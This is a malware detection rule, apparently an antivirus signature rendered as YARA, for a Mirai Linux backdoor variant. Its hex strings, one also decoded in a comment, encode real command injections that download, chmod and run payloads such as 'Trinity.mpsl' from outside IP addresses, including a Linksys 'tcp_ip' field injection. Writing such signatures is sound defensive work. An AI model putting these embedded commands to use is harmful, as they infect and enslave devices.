
rule Backdoor_Linux_Mirai_jj_MTB{
	meta:
		description = "Backdoor:Linux/Mirai.jj!MTB,SIGNATURE_TYPE_ELFHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_02_0 = {73 68 65 6c 6c 3a 63 64 20 2f 64 61 74 61 2f 6c 6f 63 61 6c 2f 74 6d 70 3b 20 63 75 72 6c 90 02 04 3a 2f 2f 31 30 34 2e 31 36 38 2e 32 34 38 2e 32 32 2f 63 2e 73 68 20 3e 20 63 2e 73 68 3b 20 77 67 65 74 90 02 04 3a 2f 2f 31 30 34 2e 31 36 38 2e 32 34 38 2e 32 32 2f 77 2e 73 68 90 00 } //3
		$a_00_1 = {74 63 70 5f 69 70 3d 2d 68 2b 25 36 30 63 64 25 32 30 25 32 46 74 6d 70 25 33 42 25 32 30 72 6d 25 32 30 2d 72 66 25 32 30 54 72 69 6e 69 74 79 2e 6d 70 73 6c 25 33 42 25 32 30 77 67 65 74 25 32 30 68 74 74 70 25 33 41 25 32 46 25 32 46 31 38 35 2e 32 34 34 2e 32 35 2e 31 33 38 25 32 46 54 72 69 6e 69 74 79 2e 6d 70 73 6c 25 33 42 25 32 30 63 68 6d 6f 64 25 32 30 37 37 37 25 32 30 54 72 69 6e 69 74 79 2e 6d 70 73 6c 25 33 42 25 32 30 2e 25 32 46 54 72 69 6e 69 74 79 2e 6d 70 73 6c 25 32 30 6c 69 6e 6b 73 79 73 } //3 tcp_ip=-h+%60cd%20%2Ftmp%3B%20rm%20-rf%20Trinity.mpsl%3B%20wget%20http%3A%2F%2F185.244.25.138%2FTrinity.mpsl%3B%20chmod%20777%20Trinity.mpsl%3B%20.%2FTrinity.mpsl%20linksys
		$a_02_2 = {73 68 65 6c 6c 5f 65 78 65 63 26 76 61 72 73 5b 31 5d 5b 5d 3d 20 27 77 67 65 74 90 02 04 3a 2f 2f 31 38 35 2e 32 34 34 2e 32 35 2e 31 33 38 2f 54 72 69 6e 69 74 79 2e 78 38 36 20 2d 4f 20 2f 74 6d 70 2f 2e 6c 6f 6c 69 3b 20 63 68 6d 6f 64 20 37 37 37 20 2f 74 6d 70 2f 2e 6c 6f 6c 69 90 00 } //2
	condition:
		((#a_02_0  & 1)*3+(#a_00_1  & 1)*3+(#a_02_2  & 1)*2) >=3
 
}